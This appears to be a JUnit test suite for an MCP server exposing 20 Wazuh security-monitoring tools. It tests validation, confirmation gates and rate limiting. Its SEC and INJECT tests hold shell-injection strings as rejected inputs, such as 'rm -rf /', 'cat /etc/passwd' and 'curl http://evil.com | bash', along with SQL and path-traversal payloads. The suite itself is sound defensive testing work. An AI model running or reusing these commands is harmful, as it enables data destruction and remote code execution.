package com.ecoskiller.mcp.wazuh;

import com.ecoskiller.mcp.wazuh.security.SecurityManager;
import com.ecoskiller.mcp.wazuh.tools.*;
import com.ecoskiller.mcp.wazuh.model.ToolResult;
import com.ecoskiller.mcp.wazuh.util.WazuhApiClient;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import org.junit.jupiter.api.*;

import java.util.Set;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Unit tests for all 20 EcoSkiller Wazuh MCP agents.
 *
 * Tests run WITHOUT a live Wazuh API — safety gates and security
 * validations are enforced entirely in Java before any API call.
 *
 * Run: mvn test
 *
 * Test categories:
 *   SEC-*    : SecurityManager validation and injection prevention
 *   SCHEMA-* : All 20 tools expose valid MCP inputSchema
 *   SAFETY-* : Confirm gates, rate-limiting, parameter validation
 *   INJECT-* : Shell/path injection in every parameter type
 *   TOOLS-*  : Tool-specific business logic validation
 */
@TestMethodOrder(MethodOrderer.OrderAnnotation.class)
class WazuhMcpTest {

    private static final ObjectMapper MAPPER = new ObjectMapper();
    private static SecurityManager security;
    private static WazuhApiClient  api;

    @BeforeAll
    static void setup() {
        security = new SecurityManager();
        api      = new WazuhApiClient(); // connects to WAZUH_API_URL env (safe to instantiate without live API)
    }

    // ════════════════════════════════════════════════════════════════════════
    // SecurityManager — Input Validation
    // ════════════════════════════════════════════════════════════════════════

    @Test @Order(1) @DisplayName("SEC-01: Valid IDs pass validation")
    void testValidIds() {
        assertDoesNotThrow(() -> security.validateId("agent-001"));
        assertDoesNotThrow(() -> security.validateId("wazuh_manager"));
        assertDoesNotThrow(() -> security.validateId("alert-uuid-12345"));
        assertDoesNotThrow(() -> security.validateId("A1"));
    }

    @Test @Order(2) @DisplayName("SEC-02: Shell injection in ID is blocked")
    void testInjectionInId() {
        assertThrows(SecurityException.class, () -> security.validateId("id; rm -rf /"));
        assertThrows(SecurityException.class, () -> security.validateId("id$(whoami)"));
        assertThrows(SecurityException.class, () -> security.validateId("id`id`"));
        assertThrows(SecurityException.class, () -> security.validateId("id|cat /etc/passwd"));
        assertThrows(SecurityException.class, () -> security.validateId("id&&curl evil.com"));
        assertThrows(SecurityException.class, () -> security.validateId("../../etc/passwd"));
    }

    @Test @Order(3) @DisplayName("SEC-03: Valid IPv4 addresses pass")
    void testValidIpAddresses() {
        assertDoesNotThrow(() -> security.validateIpAddress("192.168.1.1"));
        assertDoesNotThrow(() -> security.validateIpAddress("10.0.0.1"));
        assertDoesNotThrow(() -> security.validateIpAddress("255.255.255.255"));
        assertDoesNotThrow(() -> security.validateIpAddress("0.0.0.0"));
    }

    @Test @Order(4) @DisplayName("SEC-04: Invalid IPs are rejected")
    void testInvalidIpAddresses() {
        assertThrows(SecurityException.class, () -> security.validateIpAddress("999.1.1.1"));
        assertThrows(SecurityException.class, () -> security.validateIpAddress("192.168.1.1; rm -rf /"));
        assertThrows(SecurityException.class, () -> security.validateIpAddress("not-an-ip"));
        assertThrows(SecurityException.class, () -> security.validateIpAddress("192.168.1"));
        assertThrows(SecurityException.class, () -> security.validateIpAddress(""));
    }

    @Test @Order(5) @DisplayName("SEC-05: Valid severity levels pass")
    void testValidSeverities() {
        for (String sev : SecurityManager.ALLOWED_SEVERITIES) {
            assertDoesNotThrow(() -> security.validateSeverity(sev),
                "Severity '" + sev + "' should be allowed");
        }
        // Case-insensitive
        assertDoesNotThrow(() -> security.validateSeverity("CRITICAL"));
        assertDoesNotThrow(() -> security.validateSeverity("High"));
    }

    @Test @Order(6) @DisplayName("SEC-06: Unknown severities are rejected")
    void testInvalidSeverities() {
        assertThrows(SecurityException.class, () -> security.validateSeverity("ultra-critical"));
        assertThrows(SecurityException.class, () -> security.validateSeverity("15"));
        assertThrows(SecurityException.class, () -> security.validateSeverity("severe; DROP TABLE"));
        assertThrows(SecurityException.class, () -> security.validateSeverity(""));
    }

    @Test @Order(7) @DisplayName("SEC-07: Valid compliance frameworks pass")
    void testValidFrameworks() {
        for (String fw : SecurityManager.ALLOWED_COMPLIANCE_FRAMEWORKS) {
            assertDoesNotThrow(() -> security.validateComplianceFramework(fw));
        }
    }

    @Test @Order(8) @DisplayName("SEC-08: Unknown frameworks are rejected")
    void testInvalidFrameworks() {
        assertThrows(SecurityException.class, () -> security.validateComplianceFramework("my-custom-framework"));
        assertThrows(SecurityException.class, () -> security.validateComplianceFramework("cis; rm -rf /"));
        assertThrows(SecurityException.class, () -> security.validateComplianceFramework(""));
    }

    @Test @Order(9) @DisplayName("SEC-09: Valid Kubernetes namespaces pass")
    void testValidNamespaces() {
        for (String ns : SecurityManager.ALLOWED_NAMESPACES) {
            assertDoesNotThrow(() -> security.validateNamespace(ns));
        }
    }

    @Test @Order(10) @DisplayName("SEC-10: Unauthorized namespaces are rejected")
    void testInvalidNamespaces() {
        assertThrows(SecurityException.class, () -> security.validateNamespace("kube-system"));
        assertThrows(SecurityException.class, () -> security.validateNamespace("production"));
        assertThrows(SecurityException.class, () -> security.validateNamespace("../admin"));
        assertThrows(SecurityException.class, () -> security.validateNamespace("$(evil)"));
    }

    @Test @Order(11) @DisplayName("SEC-11: Valid rule IDs pass")
    void testValidRuleIds() {
        assertDoesNotThrow(() -> security.validateRuleId("5502"));
        assertDoesNotThrow(() -> security.validateRuleId("100001"));
        assertDoesNotThrow(() -> security.validateRuleId("1"));
        assertDoesNotThrow(() -> security.validateRuleId("999999"));
    }

    @Test @Order(12) @DisplayName("SEC-12: Invalid rule IDs are rejected")
    void testInvalidRuleIds() {
        assertThrows(SecurityException.class, () -> security.validateRuleId("rule-abc"));
        assertThrows(SecurityException.class, () -> security.validateRuleId("100001; DROP"));
        assertThrows(SecurityException.class, () -> security.validateRuleId("1234567")); // > 6 digits
        assertThrows(SecurityException.class, () -> security.validateRuleId(""));
    }

    @Test @Order(13) @DisplayName("SEC-13: Valid SHA-256 hashes pass")
    void testValidSha256() {
        assertDoesNotThrow(() -> security.validateSha256(
            "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3"));
        assertDoesNotThrow(() -> security.validateSha256(
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"));
    }

    @Test @Order(14) @DisplayName("SEC-14: Invalid hashes are rejected")
    void testInvalidSha256() {
        assertThrows(SecurityException.class, () -> security.validateSha256("abc123")); // too short
        assertThrows(SecurityException.class, () -> security.validateSha256("ZZZZ44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855ZZ")); // non-hex
        assertThrows(SecurityException.class, () -> security.validateSha256(""));
    }

    @Test @Order(15) @DisplayName("SEC-15: Valid dates pass")
    void testValidDates() {
        assertDoesNotThrow(() -> security.validateDate("2026-03-20"));
        assertDoesNotThrow(() -> security.validateDate("2026-03-20T14:25:30Z"));
        assertDoesNotThrow(() -> security.validateDate("2026-01-01T00:00:00"));
    }

    @Test @Order(16) @DisplayName("SEC-16: Invalid dates are rejected")
    void testInvalidDates() {
        assertThrows(SecurityException.class, () -> security.validateDate("not-a-date"));
        assertThrows(SecurityException.class, () -> security.validateDate("2026-13-01")); // month 13
        assertThrows(SecurityException.class, () -> security.validateDate("2026-03-20; DROP"));
        assertThrows(SecurityException.class, () -> security.validateDate(""));
    }

    @Test @Order(17) @DisplayName("SEC-17: Free-text sanitisation strips dangerous chars")
    void testFreeTextSanitise() {
        String result = security.sanitiseFreeText("notes; rm -rf /");
        assertFalse(result.contains(";"), "Semicolon should be stripped");
        assertFalse(result.contains("|"), "Pipe should be stripped");
        assertFalse(result.contains("$"), "Dollar sign should be stripped");

        String truncated = security.sanitiseFreeText("a".repeat(600));
        assertTrue(truncated.length() <= 500, "Should truncate at 500 chars");
    }

    @Test @Order(18) @DisplayName("SEC-18: Rate-limiting blocks rapid duplicate calls")
    void testRateLimiting() {
        security.checkRateLimit("test-wazuh-op-unique-1");
        assertThrows(SecurityException.class,
            () -> security.checkRateLimit("test-wazuh-op-unique-1"),
            "Second immediate call should be rate-limited");
    }

    @Test @Order(19) @DisplayName("SEC-19: Different rate-limit keys don't interfere")
    void testRateLimitingIsolation() {
        assertDoesNotThrow(() -> security.checkRateLimit("wazuh-key-A"));
        assertDoesNotThrow(() -> security.checkRateLimit("wazuh-key-B"));
    }

    @Test @Order(20) @DisplayName("SEC-20: Valid positive integers pass")
    void testValidPositiveInt() {
        assertDoesNotThrow(() -> security.validatePositiveInt("50", 1000));
        assertDoesNotThrow(() -> security.validatePositiveInt("1", 100));
        assertDoesNotThrow(() -> security.validatePositiveInt("1000", 1000));
    }

    @Test @Order(21) @DisplayName("SEC-21: Invalid integers are rejected")
    void testInvalidPositiveInt() {
        assertThrows(SecurityException.class, () -> security.validatePositiveInt("0", 100));
        assertThrows(SecurityException.class, () -> security.validatePositiveInt("-1", 100));
        assertThrows(SecurityException.class, () -> security.validatePositiveInt("abc", 100));
        assertThrows(SecurityException.class, () -> security.validatePositiveInt("1001", 1000));
        assertThrows(SecurityException.class, () -> security.validatePositiveInt("", 100));
    }

    @Test @Order(22) @DisplayName("SEC-22: Valid CIDR ranges pass")
    void testValidCidr() {
        assertDoesNotThrow(() -> security.validateCidr("192.168.1.0/24"));
        assertDoesNotThrow(() -> security.validateCidr("10.0.0.0/8"));
        assertDoesNotThrow(() -> security.validateCidr("172.16.0.0/12"));
    }

    @Test @Order(23) @DisplayName("SEC-23: Invalid CIDR ranges are rejected")
    void testInvalidCidr() {
        assertThrows(SecurityException.class, () -> security.validateCidr("192.168.1.1")); // no prefix
        assertThrows(SecurityException.class, () -> security.validateCidr("192.168.1.0/33")); // prefix too large
        assertThrows(SecurityException.class, () -> security.validateCidr("evil/cmd"));
        assertThrows(SecurityException.class, () -> security.validateCidr(""));
    }

    // ════════════════════════════════════════════════════════════════════════
    // Schema Tests — All 20 tools must expose valid MCP inputSchema
    // ════════════════════════════════════════════════════════════════════════

    @Test @Order(30) @DisplayName("SCHEMA-01: All 20 tools expose non-null inputSchema")
    void testAllToolsHaveSchema() {
        BaseTool[] tools = allTools();
        assertEquals(20, tools.length, "Expected exactly 20 tools");
        for (BaseTool tool : tools) {
            assertNotNull(tool.getInputSchema(), tool.getName() + " has null inputSchema");
            assertNotNull(tool.getInputSchema().get("type"), tool.getName() + " schema missing 'type'");
            assertNotNull(tool.getInputSchema().get("properties"), tool.getName() + " schema missing 'properties'");
        }
    }

    @Test @Order(31) @DisplayName("SCHEMA-02: All 20 tools have non-blank names and descriptions")
    void testAllToolsHaveNamesAndDescriptions() {
        for (BaseTool tool : allTools()) {
            assertFalse(tool.getName().isBlank(), tool.getClass().getSimpleName() + " has blank name");
            assertFalse(tool.getDescription().isBlank(), tool.getClass().getSimpleName() + " has blank description");
        }
    }

    @Test @Order(32) @DisplayName("SCHEMA-03: Tool names are unique")
    void testToolNamesAreUnique() {
        Set<String> names = new java.util.HashSet<>();
        for (BaseTool tool : allTools()) {
            assertTrue(names.add(tool.getName()), "Duplicate tool name: " + tool.getName());
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    // Safety Gate Tests — confirm gates block accidental execution
    // ════════════════════════════════════════════════════════════════════════

    @Test @Order(40) @DisplayName("SAFETY-01: agent_restart requires confirm=true")
    void testAgentRestartRequiresConfirm() {
        AgentRestartTool tool = new AgentRestartTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("agent_id", "001");
        args.put("confirm",  false);
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("confirm=true"));
    }

    @Test @Order(41) @DisplayName("SAFETY-02: active_response_trigger requires confirm=true")
    void testActiveResponseRequiresConfirm() {
        ActiveResponseTool tool = new ActiveResponseTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("action",   "block_ip");
        args.put("agent_id", "001");
        args.put("reason",   "test");
        args.put("confirm",  false);
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("confirm=true"));
    }

    @Test @Order(42) @DisplayName("SAFETY-03: active_response_trigger rejects unknown action")
    void testActiveResponseUnknownAction() {
        ActiveResponseTool tool = new ActiveResponseTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("action",   "destroy_everything");
        args.put("agent_id", "001");
        args.put("reason",   "test");
        args.put("confirm",  true);
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
    }

    @Test @Order(43) @DisplayName("SAFETY-04: false_positive_exception create requires confirm=true")
    void testExceptionCreateRequiresConfirm() {
        FalsePositiveExceptionTool tool = new FalsePositiveExceptionTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("action",      "create");
        args.put("rule_id",     "5502");
        args.put("reason",      "test false positive");
        args.put("expiry_date", "2026-04-01");
        args.put("confirm",     false);
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("confirm=true"));
    }

    @Test @Order(44) @DisplayName("SAFETY-05: false_positive_exception create requires reason")
    void testExceptionCreateRequiresReason() {
        FalsePositiveExceptionTool tool = new FalsePositiveExceptionTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("action",      "create");
        args.put("rule_id",     "5502");
        args.put("reason",      ""); // blank
        args.put("expiry_date", "2026-04-01");
        args.put("confirm",     true);
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("reason is required"));
    }

    @Test @Order(45) @DisplayName("SAFETY-06: false_positive_exception create requires expiry_date")
    void testExceptionCreateRequiresExpiry() {
        FalsePositiveExceptionTool tool = new FalsePositiveExceptionTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("action",      "create");
        args.put("rule_id",     "5502");
        args.put("reason",      "deployment pipeline noise");
        args.put("expiry_date", ""); // blank
        args.put("confirm",     true);
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("expiry_date is required"));
    }

    @Test @Order(46) @DisplayName("SAFETY-07: active_response_trigger requires reason")
    void testActiveResponseRequiresReason() {
        ActiveResponseTool tool = new ActiveResponseTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("action",   "block_ip");
        args.put("agent_id", "001");
        args.put("reason",   ""); // blank
        args.put("confirm",  true);
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("reason is required"));
    }

    // ════════════════════════════════════════════════════════════════════════
    // Injection Tests — shell injection in tool arguments
    // ════════════════════════════════════════════════════════════════════════

    @Test @Order(50) @DisplayName("INJECT-01: Injection in alert_query source_ip is blocked")
    void testInjectionInAlertQueryIp() {
        AlertQueryTool tool = new AlertQueryTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("source_ip", "192.168.1.1; curl http://evil.com | bash");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("Security violation"));
    }

    @Test @Order(51) @DisplayName("INJECT-02: Injection in alert_query rule_id is blocked")
    void testInjectionInAlertQueryRuleId() {
        AlertQueryTool tool = new AlertQueryTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("rule_id", "5502 UNION SELECT * FROM passwords");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("Security violation"));
    }

    @Test @Order(52) @DisplayName("INJECT-03: Injection in agent_status agent_id is blocked")
    void testInjectionInAgentStatus() {
        AgentStatusTool tool = new AgentStatusTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("agent_id", "001; cat /etc/passwd");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("Security violation"));
    }

    @Test @Order(53) @DisplayName("INJECT-04: Injection in fim_events agent_id is blocked")
    void testInjectionInFimEvents() {
        FimEventsTool tool = new FimEventsTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("agent_id", "001`id`");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("Security violation"));
    }

    @Test @Order(54) @DisplayName("INJECT-05: Injection in vulnerability_scan CVE ID is blocked")
    void testInvalidCveId() {
        VulnerabilityScanTool tool = new VulnerabilityScanTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("agent_id", "001");
        args.put("cve_id",   "CVE-DROP-TABLE--");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError(), "Invalid CVE ID should be rejected");
    }

    @Test @Order(55) @DisplayName("INJECT-06: Path traversal in agent_id is blocked")
    void testPathTraversalInAgentId() {
        AgentStatusTool tool = new AgentStatusTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("agent_id", "../../etc/wazuh");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
    }

    @Test @Order(56) @DisplayName("INJECT-07: Injection in active_response target_ip is blocked")
    void testInjectionInActiveResponseIp() {
        ActiveResponseTool tool = new ActiveResponseTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("action",    "block_ip");
        args.put("agent_id",  "001");
        args.put("target_ip", "192.168.1.1 && wget malware.sh");
        args.put("reason",    "test");
        args.put("confirm",   true);
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("Security violation"));
    }

    @Test @Order(57) @DisplayName("INJECT-08: Injection in namespace field is blocked")
    void testInjectionInNamespace() {
        ActiveResponseTool tool = new ActiveResponseTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("action",           "quarantine_pod");
        args.put("agent_id",         "001");
        args.put("target_pod",       "valid-pod");
        args.put("target_namespace", "ops; rm -rf /");
        args.put("reason",           "test");
        args.put("confirm",          true);
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("Security violation") || result.getText().contains("allow-list"));
    }

    // ════════════════════════════════════════════════════════════════════════
    // Tool-Specific Logic Tests
    // ════════════════════════════════════════════════════════════════════════

    @Test @Order(60) @DisplayName("TOOLS-01: incident_runbook lists all runbooks without ID")
    void testRunbookListWithoutId() {
        IncidentRunbookTool tool = new IncidentRunbookTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        // No runbook_id → list all
        ToolResult result = tool.execute(args);
        assertFalse(result.isError());
        assertTrue(result.getText().contains("RB-01"));
        assertTrue(result.getText().contains("RB-02"));
        assertTrue(result.getText().contains("RB-03"));
        assertTrue(result.getText().contains("RB-04"));
        assertTrue(result.getText().contains("RB-05"));
    }

    @Test @Order(61) @DisplayName("TOOLS-02: incident_runbook returns RB-01 detail")
    void testRunbookRb01Detail() {
        IncidentRunbookTool tool = new IncidentRunbookTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("runbook_id", "RB-01");
        ToolResult result = tool.execute(args);
        assertFalse(result.isError());
        assertTrue(result.getText().contains("CRITICAL"));
        assertTrue(result.getText().contains("kubectl exec as root"));
        assertTrue(result.getText().contains("T1609"));
    }

    @Test @Order(62) @DisplayName("TOOLS-03: incident_runbook rejects unknown runbook ID")
    void testRunbookUnknownId() {
        IncidentRunbookTool tool = new IncidentRunbookTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("runbook_id", "RB-99");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("Unknown runbook"));
    }

    @Test @Order(63) @DisplayName("TOOLS-04: alert_query invalid severity is rejected")
    void testAlertQueryInvalidSeverity() {
        AlertQueryTool tool = new AlertQueryTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("severity", "ultra-mega-critical");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
    }

    @Test @Order(64) @DisplayName("TOOLS-05: compliance_report invalid framework is rejected")
    void testComplianceReportInvalidFramework() {
        ComplianceReportTool tool = new ComplianceReportTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("framework", "made-up-standard");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("Security violation") || result.getText().contains("allow-list"));
    }

    @Test @Order(65) @DisplayName("TOOLS-06: threat_intelligence_check unknown check_type returns error")
    void testThreatIntelUnknownType() {
        ThreatIntelligenceTool tool = new ThreatIntelligenceTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("check_type", "unknown_action");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("Unknown check_type"));
    }

    @Test @Order(66) @DisplayName("TOOLS-07: forensic_query invalid query_type returns error")
    void testForensicQueryInvalidType() {
        ForensicQueryTool tool = new ForensicQueryTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("query_type",   "hack_the_planet");
        args.put("from_date",    "2026-03-01");
        args.put("to_date",      "2026-03-31");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("query_type must be"));
    }

    @Test @Order(67) @DisplayName("TOOLS-08: fim_events invalid event_type returns error")
    void testFimEventsInvalidType() {
        FimEventsTool tool = new FimEventsTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("agent_id",   "001");
        args.put("event_type", "corrupted");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("event_type must be"));
    }

    @Test @Order(68) @DisplayName("TOOLS-09: compliance_audit_trail invalid evidence_type returns error")
    void testComplianceAuditInvalidEvidenceType() {
        ComplianceAuditTrailTool tool = new ComplianceAuditTrailTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("framework",     "dpdpa");
        args.put("period_start",  "2026-01-01");
        args.put("period_end",    "2026-03-31");
        args.put("evidence_type", "invalid_type");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("evidence_type must be"));
    }

    @Test @Order(69) @DisplayName("TOOLS-10: behavioral_anomaly_query invalid anomaly_type returns error")
    void testBehavioralAnomalyInvalidType() {
        BehavioralAnomalyTool tool = new BehavioralAnomalyTool(security, api);
        ObjectNode args = MAPPER.createObjectNode();
        args.put("anomaly_type", "super_secret_anomaly");
        ToolResult result = tool.execute(args);
        assertTrue(result.isError());
        assertTrue(result.getText().contains("anomaly_type must be"));
    }

    // ════════════════════════════════════════════════════════════════════════
    // Helper
    // ════════════════════════════════════════════════════════════════════════

    private BaseTool[] allTools() {
        return new BaseTool[] {
            new AlertQueryTool           (security, api),
            new AlertGetTool             (security, api),
            new AgentListTool            (security, api),
            new AgentStatusTool          (security, api),
            new AgentRestartTool         (security, api),
            new RuleQueryTool            (security, api),
            new RuleGetTool              (security, api),
            new FimEventsTool            (security, api),
            new VulnerabilityScanTool    (security, api),
            new ComplianceReportTool     (security, api),
            new ThreatIntelligenceTool   (security, api),
            new ActiveResponseTool       (security, api),
            new IncidentRunbookTool      (security, api),
            new BehavioralAnomalyTool    (security, api),
            new AgentOverviewTool        (security, api),
            new KafkaAlertStatusTool     (security, api),
            new ForensicQueryTool        (security, api),
            new ManagerHealthTool        (security, api),
            new FalsePositiveExceptionTool(security, api),
            new ComplianceAuditTrailTool (security, api)
        };
    }
}
